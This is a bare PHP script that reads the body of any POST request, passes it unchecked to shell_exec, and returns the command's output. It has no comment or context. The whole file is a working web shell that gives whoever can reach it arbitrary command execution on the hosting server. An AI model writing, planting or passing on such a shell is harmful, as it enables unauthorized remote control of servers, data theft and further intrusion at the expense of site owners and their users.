<?php 
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
  $cmd = file_get_contents('php://input');
  echo $cmd . "\n";
  $output = shell_exec($cmd);
  echo $output;
}
?>
